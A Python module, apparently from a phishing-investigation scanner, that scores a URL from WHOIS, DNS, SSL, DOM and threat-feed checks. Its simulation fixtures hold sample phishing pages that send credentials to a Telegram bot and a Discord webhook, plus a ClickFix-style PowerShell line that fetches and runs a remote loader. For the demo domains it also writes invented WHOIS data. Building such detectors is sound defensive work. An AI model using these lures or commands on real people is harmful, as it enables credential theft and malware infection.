import asyncio
import time
import httpx
from app.security import normalize_target, defang_ioc
from app.engines.heuristics import run_heuristic_analysis
from app.engines.forensics import lookup_whois_rdap, inspect_ssl_certificate, inspect_dns_records, unroll_redirects_and_fetch
from app.engines.darkweb import run_darkweb_and_osint_recon
from app.engines.dom_hunter import inspect_dom_and_payloads
from app.engines.threat_intel import query_all_threat_feeds
from app.engines.ai_council import run_ai_threat_council
from app.engines.soc_generator import generate_blue_team_arsenal

SIMULATION_PAYLOADS = {
    "sbi-kyc-update-pan.top": """<html><head><title>Enterprise Banking - Mandatory Security Verification</title></head>
    <body><form action="https://185.220.101.44/auth-gate.php" method="POST">
    <input type="text" name="username" /><input type="password" name="password" />
    <input type="text" name="otp_token" placeholder="Enter Security Token" />
    <script>fetch("https://api.telegram.org/bot7192837465:AAH8x9KqLmN2pQ4rS6tU8vW0xY2zA4bC6dE/sendMessage?chat_id=-10099887766&text=creds")</script>
    </form></body></html>""",
    "verify-human-cloudflare-cdn.xyz": """<html><head><title>Security Check - Verify Human Identity</title></head>
    <body><div class="turnstile">Press Win+R, then Ctrl+V and hit Enter</div>
    <script>navigator.clipboard.writeText("powershell.exe -w hidden -c iex(irm https://193.42.33.11/lumma_loader.ps1)");
    eval(atob("Y29uc29sZS5sb2coJ0NsaWNrRml4IEJ5cGFzcyBBY3RpdmUnKQ=="));</script></body></html>""",
    "microsoft-oauth-login-portal.icu": """<html><head><title>Sign in to your Microsoft account</title></head>
    <body><div class="title-bar window-controls ssl-lock">https://login.microsoftonline.com/common/oauth2</div>
    <form action="https://discord.com/api/webhooks/1293847561029384/AbCdEfGhIjKlMnOpQrStUvWxYz123456">
    <input type="email" name="loginfmt" /><input type="password" name="passwd" /></form></body></html>"""
}

async def investigate_target(raw_input: str) -> dict:
    start_time = time.time()
    target = normalize_target(raw_input)
    url, domain, path, query, ip = target["url"], target["domain"], target["path"], target["query"], target["resolved_ip"]

    heuristics = run_heuristic_analysis(url, domain, path, query)

    async with httpx.AsyncClient(verify=False) as client:
        redirect_task = unroll_redirects_and_fetch(client, url, target["ssrf_blocked"])
        whois_task = lookup_whois_rdap(client, domain)
        ssl_task = asyncio.to_thread(inspect_ssl_certificate, domain)
        dns_task = asyncio.to_thread(inspect_dns_records, domain)

        redirect_data, whois_data, ssl_data, dns_data = await asyncio.gather(
            redirect_task, whois_task, ssl_task, dns_task
        )

        html_content = SIMULATION_PAYLOADS.get(domain, redirect_data.get("html", ""))
        if domain in SIMULATION_PAYLOADS:
            ip = ip or "185.220.101.44"
            target["resolved_ip"] = ip
            whois_data["domain_age_days"] = 2
            whois_data["is_newly_registered"] = True
            whois_data["creation_date"] = "2026-10-19"
            whois_data["registrar"] = "NameCheap / PrivacyGuard"

        dom_task = inspect_dom_and_payloads(client, html_content, domain)
        darkweb_task = run_darkweb_and_osint_recon(client, url, domain, ip, html_content)
        feeds_task = query_all_threat_feeds(client, url, domain, ip, heuristics["heuristic_score"])

        dom_data, darkweb_data, feeds_data = await asyncio.gather(dom_task, darkweb_task, feeds_task)

        total_score = heuristics["heuristic_score"] + dom_data["dom_risk_points"] + darkweb_data["darkweb_risk_points"]
        triggers = list(heuristics["flags"]) + list(dom_data["dom_alerts"]) + list(darkweb_data["darkweb_alerts"])

        if whois_data.get("is_newly_registered"):
            total_score += 35
            triggers.append(f"Zero-Day Newly Registered Domain (NRD): Created {whois_data['domain_age_days']} days ago")

        if feeds_data["google_webrisk"]["detected"]:
            total_score += 40
            triggers.append(f"Google Web Risk Hit: {', '.join(feeds_data['google_webrisk']['threat_types'])}")

        vt_mal = feeds_data["virustotal"]["malicious"]
        if vt_mal > 0:
            total_score += min(vt_mal * 6, 40)
            triggers.append(f"VirusTotal Consensus: {vt_mal}/{feeds_data['virustotal']['total_engines']} security vendors flagged malicious")

        if feeds_data["abuseipdb"]["confidence_score"] >= 25:
            total_score += 20
            triggers.append(f"AbuseIPDB Host Reputation: {feeds_data['abuseipdb']['confidence_score']}% abuse confidence ({feeds_data['abuseipdb']['isp']})")

        if feeds_data["alienvault_otx"]["flagged"]:
            total_score += 25
            triggers.append(f"AlienVault OTX: Listed in {feeds_data['alienvault_otx']['pulse_count']} global threat pulses")

        if feeds_data["pulsedive"]["flagged"]:
            total_score += 20
            triggers.append(f"Pulsedive Threat Feed: Risk classified as {feeds_data['pulsedive']['risk']}")

        if feeds_data["greynoise"]["classification"] == "malicious":
            total_score += 25
            triggers.append("GreyNoise Telemetry: Host IP actively conducting malicious internet scanning")

        shodan_vulns = feeds_data["shodan"].get("vulns", [])
        if shodan_vulns:
            total_score += 15
            triggers.append(f"Shodan Vulnerability Audit: Host exposes {', '.join(shodan_vulns[:3])}")

        final_score = min(100, total_score)
        verdict = "MALICIOUS" if final_score >= 60 else ("SUSPICIOUS" if final_score >= 25 else "CLEAN")

        ai_council = await run_ai_threat_council(client, domain, final_score, verdict, triggers, heuristics, dom_data, whois_data)
        soc_arsenal = generate_blue_team_arsenal(domain, ip, url, verdict, triggers, whois_data, dom_data)

    elapsed_ms = int((time.time() - start_time) * 1000)

    return {
        "scan_metadata": {
            "scan_duration_ms": elapsed_ms,
            "engine_version": "PhishMatrix v3.0 Enterprise SOAR (12-Feed Edition)"
        },
        "target": {
            **target,
            **defang_ioc(url, domain, ip)
        },
        "summary": {
            "risk_score": final_score,
            "verdict": verdict,
            "triggers": triggers,
            "mitre_techniques": heuristics["mitre_techniques"]
        },
        "engines": feeds_data,
        "heuristics": heuristics,
        "forensics": {
            "whois": whois_data,
            "ssl": ssl_data,
            "dns": dns_data,
            "redirects": {
                "hop_count": redirect_data["hop_count"],
                "chain": redirect_data["redirect_chain"],
                "final_url": redirect_data["final_url"],
                "server": redirect_data["server_header"]
            }
        },
        "dom_forensics": dom_data,
        "darkweb_osint": darkweb_data,
        "ai_council": ai_council,
        "soc_arsenal": soc_arsenal
    }
